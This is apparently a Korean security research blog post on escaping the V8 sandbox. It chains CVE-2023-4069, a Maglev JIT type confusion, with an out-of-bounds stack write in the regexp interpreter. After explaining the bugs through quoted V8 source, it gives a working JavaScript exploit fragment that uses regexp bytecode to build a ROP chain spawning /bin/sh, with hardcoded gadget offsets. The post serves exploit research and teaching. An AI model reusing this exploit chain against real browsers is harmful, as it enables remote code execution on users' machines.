---
layout: post
title: "V8 Heap Sandbox Escape with Regexp - 2"
categories: v8
author:
  - c0w5un
---

# 1. Introduction

첫 번째 시리즈에서 언급한대로 실제 Caged AAR/W 취약점과 이전 글에서 설명한 취약점을 결합하여 V8에서 RCE를 획득하는 방법에 대해서 소개하겠습니다.

본 글은 V8 익스플로잇에 대한 어느정도 지식 (addrof, fakeobj 프리미티브 등)이 있다는 가정하에 글을 작성하였으니 참고 부탁드립니다. (해당 내용을 알고싶다면 이 [링크](https://jhalon.github.io/chrome-browser-exploitation-1/)를 참고하세요.)

또한 V8 Sandbox Escape 취약점은 첫 번째 시리즈 글에서 소개가 되었으니 해당 글을 읽고 본 글을 읽는 것을 추천합니다.

# 2. Caged AAR/W

본 글에서 Caged AAR/W를 획득하기 위해 활용한 취약점은 `CVE-2023-4069` 이며, 이 [링크](https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/)의 글을 참고하여 취약점 이해 및 익스플로잇 작성을 수행했습니다.

추가적으로 본 글에서 RCE까지 수행하는 환경은 다음과 같습니다.

```bash
# commit
4c11841391c

# arg.gn
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
use_goma = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
v8_optimized_debug = false
dcheck_always_on = false
```

## Maglev

본 글은 V8 SBX에 대한 내용을 중점적으로 다루고 있기에 취약점이 발생하는 `Maglev` JIT 컴파일러에 대한 내용과 취약점 원인에 대한 설명은 간단히 다루도록 하겠습니다.

[V8 블로그](https://v8.dev/blog/maglev)에 따르면 Maglev은 V8의 중간층(mid-tier) 최적화 JIT 컴파일러로, 

기존 Ignition → Sparkplug → TurboFan의 3-단계 실행 파이프라인에서 Sparkplug와 TurboFan 사이를 메웁니다. 컴파일 속도는 Sparkplug보다 느리지만 TurboFan보다 훨씬 빠르고, 실행 코드는 Sparkplug보다 빠른 “충분히 좋은” 품질을 목표로 합니다. Chrome **M117(2023)** 에서 도입되었습니다.

더 직관적으로 설명하면 반복 문의 반복 횟수가 1000정도면 Maglev 컴파일러가 해당 반복 문 혹은 함수를 최적화하게 됩니다.

## CVE-2023-4069

취약 코드는 **`MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct`** 입니다.

이 루틴은 new_target이 상수 함수로 알려진 경우 빠른 경로로 BuildAllocateFastObject(FastObject(...)) 를 호출해 new_target의 initial_map을 사용해 디폴트 receiver 객체를 바로 만듭니다.

문제는 여기서 다음과 같은 **두 가지 검증이 빠져있습니다.**

1. new_target이 실제로 initial_map을 갖는지 확인 누락
2. 생성에 쓸 initial_map.constructor 가 실제 호출되는 target 과 같은지 확인하지 않아, target ≠ new_target 조합(예: Reflect.construct(target, args, newTarget) 또는 상속된 생성자)에서 잘못된 맵/레이아웃의 객체를 만들어 타입 혼동으로 이어집니다. 원래의 느린 경로(FastNewObject→런타임 경로)는 이 조건에서 bail-out 하여 올바른 맵을 만들도록 되어 있었는데, Maglev의 빠른 경로가 그 검증을 누락한 것입니다.

자세한 내용은 이 [링크](https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/)를 확인하시면 됩니다.

해당 취약점 트리거에 성공하여 `addrof`, `fakeobj` 프리미티브를 획득 후 `caged aar/w` 까지 구현을 완료했다면 이제 V8 Sandbox Escape 취약점을 활용해 control flow를 조작하여 공격자가 원하는 코드를 실행하는 순서를 갖겠습니다.

# 3. Caged AAR/W

이전 글에서 소개한 취약점을 잠깐 리마인드하고 진행하도록 하겠습니다.

```cpp
#define BYTECODE_ITERATOR(V)                                                   \
  V(SET_REGISTER, 8, 8)       /* bc8 reg_idx24 value32                      */ \
  V(SUCCEED, 14, 4)           /* bc8 pad24                                  */ \

template <typename Char>
IrregexpInterpreter::Result RawMatch(
    Isolate* isolate, ByteArray code_array, String subject_string,
    base::Vector<const Char> subject, int* output_registers,
    int output_register_count, int total_register_count, int current,
    uint32_t current_char, RegExp::CallOrigin call_origin,
    const uint32_t backtrack_limit) {
  DisallowGarbageCollection no_gc;

// ...
  InterpreterRegisters registers(total_register_count, output_registers,
                                 output_register_count);
// ...
  while (true) {
    const uint8_t* next_pc = pc;
    int32_t insn;
    int32_t next_insn;
#if V8_USE_COMPUTED_GOTO
    const void* next_handler_addr;
    DECODE();
    DISPATCH();
#else
    insn = Load32Aligned(pc);
    switch (insn & BYTECODE_MASK) {
#endif  // V8_USE_COMPUTED_GOTO

// ...
    BYTECODE(SET_REGISTER) {
      ADVANCE(SET_REGISTER);
      registers[LoadPacked24Unsigned(insn)] = Load32Aligned(pc + 4); // --- [a]
      DISPATCH();
    }
// ...
	  BYTECODE(SUCCEED) {
      isolate->counters()->regexp_backtracks()->AddSample(
          static_cast<int>(backtrack_count));
      registers.CopyToOutputRegisters();
      return IrregexpInterpreter::SUCCESS;
    }
// ...
}
```

이전 글에서 언급된 `RawMatch` 함수입니다. 여기서 코드 [a] 부분을 살펴보면 `InterpreterRegisters` 타입의 객체 `registers` 를 참조할때 operator[]를 사용하게 됩니다.

```cpp
class InterpreterRegisters {
 public:
  using RegisterT = int;

  InterpreterRegisters(int total_register_count, RegisterT* output_registers,
                       int output_register_count)
      : registers_(total_register_count),
        output_registers_(output_registers),
        output_register_count_(output_register_count) {
    // TODO(jgruber): Use int32_t consistently for registers. Currently, CSA
    // uses int32_t while runtime uses int.
    static_assert(sizeof(int) == sizeof(int32_t));
    DCHECK_GE(output_register_count, 2);  // At least 2 for the match itself.
    DCHECK_GE(total_register_count, output_register_count);
    DCHECK_LE(total_register_count, RegExpMacroAssembler::kMaxRegisterCount);
    DCHECK_NOT_NULL(output_registers);

    // Initialize the output register region to -1 signifying 'no match'.
    std::memset(registers_.data(), -1,
                output_register_count * sizeof(RegisterT));
  }

  const RegisterT& operator[](size_t index) const { return registers_[index]; }
  RegisterT& operator[](size_t index) { return registers_[index]; }

 private:
  static constexpr int kStaticCapacity = 64;  // Arbitrary.
  base::SmallVector<RegisterT, kStaticCapacity> registers_;
}
```

`InterpreterRegisters` 객체의`operator[]` 함수의 동작은 맴버 변수로 존재하는 `registers_` 에 대해서 `operator[]` 를 수행합니다.

따라서 `registers_` 맴버 변수의 `operator[]` 함수 동작을 확인해보면

```cpp
template <typename T, size_t kSize, typename Allocator = std::allocator<T>>
class SmallVector {
  // Currently only support trivially destructible data types, as it is not
  // guaranteed to call destructors.
  static_assert(std::is_trivially_destructible<T>::value);

 public:
  static constexpr size_t kInlineSize = kSize;
  using value_type = T;

//...

  T& operator[](size_t index) {
    DCHECK_GT(size(), index);
    return begin_[index];
  }

//...
  const T& operator[](size_t index) const { return at(index); }

// ...
  T* inline_storage_begin() { return reinterpret_cast<T*>(&inline_storage_); }
  const T* inline_storage_begin() const {
    return reinterpret_cast<const T*>(&inline_storage_);
  }

  V8_NO_UNIQUE_ADDRESS Allocator allocator_;

  T* begin_ = inline_storage_begin();
  T* end_ = begin_;
  T* end_of_storage_ = begin_ + kInlineSize;
  typename std::aligned_storage<sizeof(T) * kInlineSize, alignof(T)>::type
      inline_storage_;
};
```

맴버 변수로 존재하는 `begin_` 포인터를 인덱스로 참조하는 것을 최종적으로 확인할 수 있습니다.

따라서 정리하면, 취약점을 통해 `begin_` 포인터가 가리키고 있는 곳에 대하여 OOB r/w 가 가능하다고 볼 수 있습니다.

여기서 문제는 `begin_` 포인터 값이 어느 영역을 가리키고 있느냐인데 위의 내용을 다시 살펴보면

```cpp
#define BYTECODE_ITERATOR(V)                                                   \
  V(SET_REGISTER, 8, 8)       /* bc8 reg_idx24 value32                      */ \
  V(SUCCEED, 14, 4)           /* bc8 pad24                                  */ \

template <typename Char>
IrregexpInterpreter::Result RawMatch(
    Isolate* isolate, ByteArray code_array, String subject_string,
    base::Vector<const Char> subject, int* output_registers,
    int output_register_count, int total_register_count, int current,
    uint32_t current_char, RegExp::CallOrigin call_origin,
    const uint32_t backtrack_limit) {
// ...
  InterpreterRegisters registers(total_register_count, output_registers,
                                 output_register_count);
// ...
}

class InterpreterRegisters {
 public:
  using RegisterT = int;

//...
 private:
  static constexpr int kStaticCapacity = 64;  // Arbitrary.
  base::SmallVector<RegisterT, kStaticCapacity> registers_;
}

template <typename T, size_t kSize, typename Allocator = std::allocator<T>>
class SmallVector {
// ...
  T* inline_storage_begin() { return reinterpret_cast<T*>(&inline_storage_); }
  const T* inline_storage_begin() const {
    return reinterpret_cast<const T*>(&inline_storage_);
  }

  V8_NO_UNIQUE_ADDRESS Allocator allocator_;

  T* begin_ = inline_storage_begin();
  T* end_ = begin_;
  T* end_of_storage_ = begin_ + kInlineSize;
  typename std::aligned_storage<sizeof(T) * kInlineSize, alignof(T)>::type
      inline_storage_;
};
```

- `RawMatch` 함수에서 지역 변수로 `InterpreterRegisters` 클래스 타입 객체 생성
- `InterpreterRegisters` 에 `base::SmallVector<RegisterT, kStaticCapacity>` 클래스 타입 객체 존재
- `SmallVector` 클래스에서 `kStaticCapacity` 만큼 `inline_storage` 사용

이 내용을 종합해보면 `registers` 의 `begin_` 포인터는 현재 `RawMatch` 함수의 스택 내부를 가리키게 된다는 것을 알 수 있습니다.

최종적으로 스택 OOB r/w가 가능함을 확인할 수 있고, 이를 통해 Control flow 제어 및 RCE를 수행하는 방향으로 진행하겠습니다.

# 4. RCE

(RCE의 내용은 [여기](https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp)를 참고했습니다.)

`RawMatch` 함수 내부에 구현되어 있는 바이트코드가 꽤나 있는 것을 확인할 수 있습니다. 

```cpp
    BYTECODE(BREAK) { UNREACHABLE(); }
    BYTECODE(PUSH_CP) {
      ADVANCE(PUSH_CP);
      if (!backtrack_stack.push(current)) {
        return MaybeThrowStackOverflow(isolate, call_origin);
      }
      DISPATCH();
    }

...

    BYTECODE(LOAD_CURRENT_CHAR) {
      int pos = current + LoadPacked24Signed(insn);
      if (pos >= subject.length() || pos < 0) {
        SET_PC_FROM_OFFSET(Load32Aligned(pc + 4));
      } else {
        ADVANCE(LOAD_CURRENT_CHAR);
        current_char = subject[pos];
      }
      DISPATCH();
    }
```

이 중에서 다음과 같은 바이트코드를 익스플로잇에 활용하여 RCE를 수행하도록 하겠습니다.

- PUSH_REGISTER
- SET_REGISTER
- ADVANCE_REGISTER
- POP_REGISTER
- SUCCEED

바이트코드의 구현은 다음과 같습니다.

```cpp
   BYTECODE(PUSH_REGISTER) {
      ADVANCE(PUSH_REGISTER);
      if (!backtrack_stack.push(registers[LoadPacked24Unsigned(insn)])) {
        return MaybeThrowStackOverflow(isolate, call_origin);
      }
      DISPATCH();
    }
    BYTECODE(SET_REGISTER) {
      ADVANCE(SET_REGISTER);
      registers[LoadPacked24Unsigned(insn)] = Load32Aligned(pc + 4);
      DISPATCH();
    }
    BYTECODE(ADVANCE_REGISTER) {
      ADVANCE(ADVANCE_REGISTER);
      registers[LoadPacked24Unsigned(insn)] += Load32Aligned(pc + 4);
      DISPATCH();
		}
    BYTECODE(POP_REGISTER) {
      ADVANCE(POP_REGISTER);
      registers[LoadPacked24Unsigned(insn)] = backtrack_stack.pop();
      DISPATCH();
    }
    BYTECODE(SUCCEED) {
      isolate->counters()->regexp_backtracks()->AddSample(
          static_cast<int>(backtrack_count));
      registers.CopyToOutputRegisters();
      return IrregexpInterpreter::SUCCESS;
    }
```

바이트 코드를 활용한 RCE 계획은 다음과 같습니다.

1. `POP_REGISTER` 를 활용해 값을 가져오고 해당 값을 `ADVANCE_REGISTER` 를 활용해 스택 포인터, 라이브러리 주소를 계산합니다.
2. 스택에 `"/bin/sh"` 문자열을 삽입하고 ROP을 수행할 가젯을 반환 포인터 이후로 `SET_REGISTER` 를 활용해 삽입합니다.
3. 마지막으로 `SUCCEED` 를 삽입하여 `RawMatch` 함수를 반환하고 ROP를 수행하여 쉘을 획득합니다.

위의 RCE 코드의 일부분을 살펴보면 다음과 같습니다.

```jsx

let arr = [];

function push_reg(idx) {
  arr.push((idx << 8) & 0xffffff00 | 0x03);
}

function pop_reg(idx) {
  arr.push((idx << 8) & 0xffffff00 | 0x0c);
}

function mov_reg1_to_reg2(idx1, idx2) {
  push_reg(idx1);
  pop_reg(idx2);
}

function set_reg(idx, value) {
  arr.push((idx << 8) & 0xffffff00 | 0x08);
  arr.push(value);
}

function adv_reg(idx, value) {
  arr.push((idx << 8) & 0xffffff00 | 0x09);
  arr.push(value);
}

function success() {
    arr.push(0x0000000e);
}

const pop_rdi_ret = 0x0000000000cdc35a; // : pop rdi ; ret
const pop_rsi_ret = 0x0000000000cf0f7e; // : pop rsi; ret
const pop_rax_ret = 0x0000000000c97d8f; // : pop rax ; ret
const pop_rdx_ret = 0x0000000000c6dd33; // : pop rdx ; ret
const push_rsp_pop_rdi_ret = 0x0000000001746ee8; // : push rsp ; pop rdi ; ret
const syscall = 0x0000000000c9a9d4; // : syscall
const mov_rax_rsp = 0x000000000137c941; // : mov rbp, rsp ; mov rax, rbp ; pop rbp ; ret
const mov_rdi_rax = 0x0000000001800aa5; // : mov rdi, rax ; mov rax, qword ptr [rdi] ; pop rbp ; ret

const MatchInternal_offset = 0x128ab5f;

let ret_sp = 0x52;
const base_sp = 0x10;
const tmp_sp = 0x20;

mov_reg1_to_reg2(ret_sp, base_sp);
mov_reg1_to_reg2(ret_sp+1, base_sp+1);

adv_reg(base_sp, -(MatchInternal_offset & 0xffffffff));

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, mov_rax_rsp);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);
set_reg(ret_sp++, 0x6e69622f);
set_reg(ret_sp++, 0x0068732f);

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, mov_rdi_rax);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);
set_reg(ret_sp++, 0x68732f6e);
set_reg(ret_sp++, 0x69622f00);

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, pop_rax_ret);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);
set_reg(ret_sp++, 0x3b);
set_reg(ret_sp++, 0);

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, pop_rsi_ret);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);
set_reg(ret_sp++, 0);
set_reg(ret_sp++, 0);

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, pop_rdx_ret);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);
set_reg(ret_sp++, 0);
set_reg(ret_sp++, 0);

mov_reg1_to_reg2(base_sp, ret_sp);
adv_reg(ret_sp++, syscall);
mov_reg1_to_reg2(base_sp + 1, ret_sp++);

success();

```

RCE 전체 코드를 살펴보려면 [여기](https://github.com/Kangwoosun/Exploit_repo/blob/main/v8/CVE-2023-4069/rce_new.js)를 참조해주시면 되겠습니다.

# 5. Conclusion

총 두 개의 시리즈를 통해서 V8 Sandbox가 적용된 바이너리에 대한 취약점 두 개를 활용해 익스플로잇까지 수행해보았습니다.

기존 aar/w 프리미티브 만으로 거의 확정적인 익스플로잇이 가능했다면, 지금은  V8 Sandbox를 우회하는 취약점이 필요하여 익스플로잇에 도달하는데에 도전 과제가 하나 더 생긴 것을 살펴보았습니다.

앞으로 V8 Sandbox 우회 취약점을 발견하더라도 해당 취약점이 발생하는 컴포넌트와 취약점을 통해 접근 범위에 따라 익스플로잇 가능 여부가 결정되기 때문에 각 컴포넌트에 대한 추가적인 이해도가 필요해보입니다.

이 글을 통해 V8 Sandbox 에 대한 인사이트와 이해도를 조금이나마 얻을 수 있길 바라며 자바스크립트 엔진을 공부하는 연구원 분들께 도움이 되길 바라며 글을 마무리하겠습니다.

끝까지 읽어주심에 감사드립니다.

# 6. Reference

- https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/
- https://issues.chromium.org/issues/330404819
- https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp
- https://jhalon.github.io/chrome-browser-exploitation-1/